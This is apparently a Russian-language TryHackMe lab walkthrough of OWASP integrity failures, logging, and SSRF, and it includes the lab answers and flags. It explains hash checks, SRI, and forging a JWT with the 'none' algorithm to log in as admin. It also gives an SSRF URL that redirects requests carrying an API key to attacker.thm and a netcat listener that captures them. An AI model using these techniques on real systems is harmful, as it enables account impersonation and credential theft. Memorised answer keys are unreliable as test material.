Когда мы говорим о целостности, мы имеем в виду способность удостовериться, что часть данных остается неизмененной. Целостность имеет важное значение в кибербезопасности, поскольку мы заботимся о сохранении важных данных без нежелательных или вредоносных изменений. Например, предположим, что вы загружаете последнюю версию установщика для приложения. Как вы можете быть уверены, что во время загрузки он не был изменен при передаче или каким-то образом поврежден из-за ошибки передачи?

Чтобы обойти эту проблему, вы часто будете видеть хэш,  отправленный вместе с файлом, чтобы вы могли доказать, что загруженный вами файл сохранил свою целостность и не был изменен при передаче. Хэш или дайджест — это просто число, которое получается в результате применения определенного алгоритма к фрагменту данных. Читая об алгоритмах хеширования, вы часто будете читать о MD5 , SHA1, SHA256 или многих других доступных.

Давайте возьмем WinSCP в качестве примера, чтобы лучше понять, как мы можем использовать хэши для проверки целостности файла.  Если вы зайдете в их репозиторий Sourceforge , вы увидите, что для каждого файла, доступного для загрузки, опубликованы некоторые хэши:

WinSCP-хэши

Эти хэши были предварительно рассчитаны создателями WinSCP, чтобы вы могли проверить целостность файла после загрузки. Если мы загрузим файл WinSCP-5.21.5-Setup.exe, мы сможем пересчитать хэши и сравнить их с опубликованными в Sourceforge. Чтобы вычислить различные хэши в Linux , мы можем использовать следующие команды:

Атакующий бокс
```commandline
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```
Поскольку мы получили одинаковые хеши, мы можем с уверенностью заключить, что загруженный нами файл является точной копией файла на сайте.

Ошибки программного обеспечения и целостности данных

Эта уязвимость возникает из-за кода или инфраструктуры, которые используют программное обеспечение или данные без использования каких-либо проверок целостности. Поскольку проверка целостности не выполняется, злоумышленник может изменить программное обеспечение или данные, переданные приложению, что приведет к неожиданным последствиям. В этой категории в основном есть два типа уязвимостей:

Нарушения целостности программного обеспечения
Нарушения целостности данных
### Ответьте на вопросы ниже
Прочитайте вышеизложенное и продолжайте!

```commandline
Ответ не нужен
```

## Задание 19
Нарушения целостности программного обеспечения

Предположим, у вас есть веб-сайт, который использует сторонние библиотеки, хранящиеся на внешних серверах, которые вы не можете контролировать. Хотя это может показаться немного странным, на самом деле это довольно распространенная практика. Возьмем в качестве примера jQuery, широко используемую библиотеку javascript. Если хотите, вы можете включить jQuery на свой веб-сайт напрямую с их серверов, не загружая его, включив следующую строку в HTML-код вашего веб-сайта:

`<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>`
Когда пользователь заходит на ваш сайт, его браузер считывает HTML-код и загружает jQuery из указанного внешнего источника.

JS без проверки целостности

Проблема в том, что если злоумышленник каким-то образом взломает официальный репозиторий jQuery, он может изменить содержимое, https://code.jquery.com/jquery-3.6.1.min.js чтобы внедрить вредоносный код. В результате любой, кто посетит ваш сайт, теперь получит вредоносный код и выполнит его в своих браузерах, не зная об этом. Это нарушение целостности программного обеспечения, поскольку ваш сайт не проверяет стороннюю библиотеку, чтобы узнать, изменилась ли она. Современные браузеры позволяют вам указывать хэш по URL-адресу библиотеки, так что код библиотеки будет выполняться только в том случае, если хэш загруженного файла соответствует ожидаемому значению. Этот механизм безопасности называется Subresource Integrity (SRI), и вы можете прочитать о нем больше  здесь .

Правильный способ вставить библиотеку в ваш HTML-код — использовать SRI и включить хэш целостности, чтобы если каким-то образом злоумышленник сможет изменить библиотеку, любой клиент, просматривающий ваш сайт, не выполнил измененную версию. Вот как это должно выглядеть в HTML:

`<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>`
При необходимости вы можете зайти на  сайт https://www.srihash.org/,  чтобы сгенерировать хеши для любой библиотеки.

### Ответьте на вопросы ниже
Каков хэш SHA-256 https://code.jquery.com/jquery-1.12.4.min.js?


```commandline
sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
```

## Задание 20
Нарушения целостности данных

Давайте подумаем о том, как веб-приложения поддерживают сеансы. Обычно, когда пользователь входит в приложение, ему назначается некий токен сеанса, который необходимо сохранить в браузере на все время сеанса. Этот токен будет повторяться при каждом последующем запросе, чтобы веб-приложение знало, кто мы. Эти токены сеанса могут иметь множество форм, но обычно назначаются через файлы cookie. Файлы cookie — это пары ключ-значение, которые веб-приложение будет хранить в браузере пользователя и которые будут автоматически повторяться при каждом запросе к веб-сайту, который их выдал.

Файлы cookie

Например, если вы создаете приложение веб-почты, вы можете назначить каждому пользователю после входа в систему файл cookie, содержащий его имя пользователя. В последующих запросах ваш браузер всегда будет отправлять ваше имя пользователя в файле cookie, чтобы ваше веб-приложение знало, какой пользователь подключается. Это было бы ужасной идеей с точки зрения безопасности, поскольку, как мы уже упоминали, файлы cookie хранятся в браузере пользователя, поэтому если пользователь подделает файл cookie и изменит имя пользователя, он потенциально может выдать себя за кого-то другого и прочитать его электронные письма! Это приложение будет страдать от сбоя целостности данных, поскольку оно доверяет данным, которые злоумышленник может подделать.

Одним из решений этой проблемы является использование некоторого механизма целостности, гарантирующего, что cookie не был изменен пользователем. Чтобы не изобретать велосипед, мы могли бы использовать некоторые реализации токенов, которые позволяют вам делать это и иметь дело со всей криптографией, чтобы предоставить доказательство целостности без необходимости для вас беспокоиться об этом. Одной из таких реализаций является JSON Web Tokens (JWT) .

JWT — это очень простые токены, которые позволяют хранить пары ключ-значение на токене, который обеспечивает целостность как часть токена. Идея заключается в том, что вы можете генерировать токены, которые вы можете предоставить своим пользователям с уверенностью, что они не смогут изменить пары ключ-значение и пройти проверку целостности. Структура токена JWT состоит из 3 частей:

Веб-токены JSON

Заголовок содержит метаданные, указывающие, что это JWT, а используемый алгоритм подписи — HS256. Полезная нагрузка содержит пары ключ-значение с данными, которые веб-приложение хочет, чтобы клиент сохранил. Подпись похожа на хэш, используемый для проверки целостности полезной нагрузки. Если вы измените полезную нагрузку, веб-приложение может проверить, что подпись не будет соответствовать полезной нагрузке, и узнать, что вы подделали JWT. В отличие от простого хеша, эта подпись подразумевает использование секретного ключа, хранящегося только на сервере, что означает, что если вы измените полезную нагрузку, вы не сможете сгенерировать соответствующую подпись, если не знаете секретный ключ.

Обратите внимание, что каждая из 3 частей токена — это просто открытый текст, закодированный с помощью base64. Вы можете использовать этот онлайн-инструмент для кодирования/декодирования base64. Попробуйте декодировать заголовок и полезную нагрузку следующего токена:

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw

Примечание: подпись содержит двоичные данные, поэтому даже если вы ее расшифруете, вы все равно не сможете извлечь из нее особого смысла.

JWT и алгоритм None

Уязвимость нарушения целостности данных присутствовала в некоторых библиотеках, реализующих JWT некоторое время назад. Как мы видели, JWT реализует подпись для проверки целостности данных полезной нагрузки. Уязвимые библиотеки позволяли злоумышленникам обойти проверку подписи, изменив две следующие вещи в JWT:

Измените раздел заголовка токена так, чтобы alg заголовок содержал значение none.
Удалите часть подписи.
Если взять JWT из предыдущего примера, если бы мы хотели изменить полезную нагрузку так, чтобы имя пользователя стало "admin" и проверка подписи не производилась, нам пришлось бы декодировать заголовок и полезную нагрузку, изменить их по мере необходимости и закодировать обратно. Обратите внимание, как мы удалили часть подписи, но сохранили точку в конце.

JWT Нет Алгоритм

Звучит довольно просто! Давайте рассмотрим процесс, которому должен следовать злоумышленник в примерном сценарии. Перейдите по адресу  http://MACHINE_IP:8089/  и следуйте инструкциям в вопросах ниже.

### Ответьте на вопросы ниже
Попробуйте войти в приложение как гость. Какой пароль у гостевой учетной записи?


```commandline
guest
```
Если вход в систему прошел успешно, теперь в вашем браузере должен быть сохранен JWT в виде cookie. Нажмите F12, чтобы открыть Developer Tools.

В зависимости от вашего браузера вы сможете редактировать файлы cookie на следующих вкладках:

Firefox

Инструменты разработчика Firefox

Хром

Инструменты разработчика Chrome

Как называется файл cookie веб-сайта, содержащий токен JWT?
```commandline
jwt-session
```
Используйте знания, полученные в ходе выполнения этой задачи, чтобы изменить токен JWT таким образом, чтобы приложение считало вас пользователем «admin».
```commandline
Ответ не нужен
```
Какой флаг отображается для пользователя-администратора?
```commandline
THM{Dont_take_cookies_from_strangers}
```
## Задание 21
При настройке веб-приложений каждое действие, выполняемое пользователем, должно регистрироваться. Регистрация важна, поскольку в случае инцидента можно отследить действия злоумышленников. После отслеживания их действий можно определить их риск и воздействие. Без регистрации невозможно будет определить, какие действия были выполнены злоумышленником, если он получит доступ к определенным веб-приложениям. Наиболее существенные последствия включают:

Ущерб, наносимый нормативным актам: если злоумышленник получил доступ к персональным данным пользователя и об этом нет никаких записей, то страдают конечные пользователи, а владельцы приложений могут быть оштрафованы или подвергнуты более строгим мерам в зависимости от нормативных актов.
Риск дальнейших атак: присутствие злоумышленника может остаться незамеченным без регистрации. Это может позволить злоумышленнику начать дальнейшие атаки против владельцев веб-приложений, похищая учетные данные, атакуя инфраструктуру и т. д.
Информация, хранящаяся в журналах, должна включать следующее:

Коды статуса HTTP
Временные метки
Имена пользователей
Конечные точки API /расположения страниц
IP-адреса
Эти журналы содержат некоторую конфиденциальную информацию, поэтому важно обеспечить их безопасное хранение и хранение нескольких копий этих журналов в разных местах.

Как вы могли заметить, ведение журнала становится более важным после того, как произошел взлом или инцидент. Идеальный случай — иметь мониторинг для обнаружения любой подозрительной активности. Цель обнаружения этой подозрительной активности — либо полностью остановить злоумышленника, либо уменьшить нанесенное им воздействие, если его присутствие было обнаружено намного позже, чем предполагалось. Распространенные примеры подозрительной активности включают:

Многочисленные несанкционированные попытки выполнения определенного действия (обычно попытки аутентификации или доступа к несанкционированным ресурсам, например, страницам администратора)
Запросы с аномальных IP-адресов или местоположений: хотя это может указывать на то, что кто-то другой пытается получить доступ к учетной записи конкретного пользователя, также возможен и процент ложных срабатываний.
Использование автоматизированных инструментов: конкретный автоматизированный инструментарий может быть легко идентифицирован, например, с использованием значения заголовков User-Agent или скорости запросов. Это может указывать на то, что злоумышленник использует автоматизированный инструментарий.
Распространенные полезные нагрузки: в веб-приложениях злоумышленники часто используют известные полезные нагрузки. Обнаружение использования этих полезных нагрузок может указывать на присутствие кого-то, проводящего несанкционированное/вредоносное тестирование приложений.
Простое обнаружение подозрительной активности не приносит пользы. Эту подозрительную активность необходимо оценить по уровню воздействия. Например, некоторые действия будут иметь более сильное воздействие, чем другие. На эти действия с более сильным воздействием необходимо реагировать раньше; таким образом, они должны вызывать тревогу, чтобы привлечь внимание соответствующих сторон.

Примените эти знания на практике, проанализировав предоставленный пример файла журнала. Вы можете загрузить его, нажав Download Task Filesкнопку в верхней части задания.

### Ответьте на вопросы ниже
Какой IP-адрес использует злоумышленник?
```commandline
49.99.13.16
```
Какой тип атаки осуществляется?
```commandline
Brute Force
```

## Задание 22
Подделка запросов на стороне сервера

Этот тип уязвимости возникает, когда злоумышленник может заставить веб-приложение отправлять запросы от его имени в произвольные пункты назначения, имея при этом контроль над содержимым самого запроса. Уязвимости SSRF часто возникают из-за реализаций, где нашему веб-приложению необходимо использовать сторонние сервисы.

Представьте себе, например, веб-приложение, которое использует внешний API для отправки SMS-уведомлений своим клиентам. Для каждого электронного письма веб-сайт должен сделать веб-запрос на сервер поставщика SMS для отправки содержимого сообщения, которое должно быть отправлено. Поскольку поставщик SMS взимает плату за каждое сообщение, они требуют, чтобы вы добавляли секретный ключ, который они заранее назначают вам, к каждому запросу, который вы делаете к их API . Ключ API служит маркером аутентификации и позволяет поставщику узнать, кому выставлять счет за каждое сообщение. Приложение будет работать следующим образом:

ССРФ

Глядя на схему выше, легко увидеть, где находится уязвимость. Приложение предоставляет  server пользователям параметр, который определяет имя сервера поставщика услуг SMS. Если бы злоумышленник захотел, он мог бы просто изменить значение to,  serverуказав на машину, которой он управляет, и ваше веб-приложение с радостью переслало бы SMS-запрос злоумышленнику вместо поставщика SMS. В рамках пересланного сообщения злоумышленник получил бы ключ API , что позволило бы ему использовать службу SMS для отправки сообщений за ваш счет. Чтобы добиться этого, злоумышленнику нужно было бы только сделать следующий запрос на ваш веб-сайт:

https://www.mysite.com/sms?server=attacker.thm&msg=ABC

Это заставит уязвимое веб-приложение сделать запрос на:

https://attacker.thm/api/send?msg=ABC 

Затем вы можете просто перехватить содержимое запроса с помощью Netcat:

Атакующий бокс
```commandline
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```
Это действительно базовый случай SSRF. Если это не выглядит таким уж пугающим, SSRF на самом деле можно использовать для гораздо большего. В общем, в зависимости от особенностей каждого сценария, SSRF можно использовать для:

Перечислите внутренние сети, включая IP-адреса и порты.
Злоупотребляйте доверительными отношениями между серверами и получайте доступ к услугам, которые в противном случае были бы ограничены.
Взаимодействовать с некоторыми не- HTTP- сервисами для удаленного выполнения кода ( RCE ).
Давайте быстро рассмотрим, как можно использовать SSRF для злоупотребления некоторыми доверительными отношениями.

Практический пример

Перейдите по адресу  http://MACHINE_IP:8087/ , где вы найдете простое веб-приложение. Немного поразмыслив, вы увидите область администратора, которая и будет нашей главной целью. Следуйте инструкциям по следующим вопросам, чтобы получить доступ к закрытой области веб-сайта!

### Ответьте на вопросы ниже
Исследуйте веб-сайт. Какому единственному хостеру разрешен доступ к административной области?
```commandline
localhost
```
Проверьте кнопку «Загрузить резюме». Куда указывает параметр сервера?
```commandline
secure-file-storage.com
```
Используя SSRF, заставьте приложение отправлять запрос на ваш AttackBox вместо защищенного хранилища файлов. Есть ли в перехваченном запросе какие-либо API-ключи?
```commandline
THM{Hello_Im_just_an_API_key}
```
Пройдя лишнюю милю: есть способ использовать SSRF для получения доступа к административной части сайта. Сможете ли вы его найти? 

Примечание: Вам не понадобится этот флаг для продвижения в комнате. Вам нужно будет провести некоторые исследования, чтобы достичь своей цели.
```commandline
Ответ не нужен
```

## Задание 23
Что дальше?
Почему бы не записаться на наш курс начального уровня или не найти другую комнату для прохождения курса?

### Ответьте на вопросы ниже
Прочитайте вышесказанное!
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)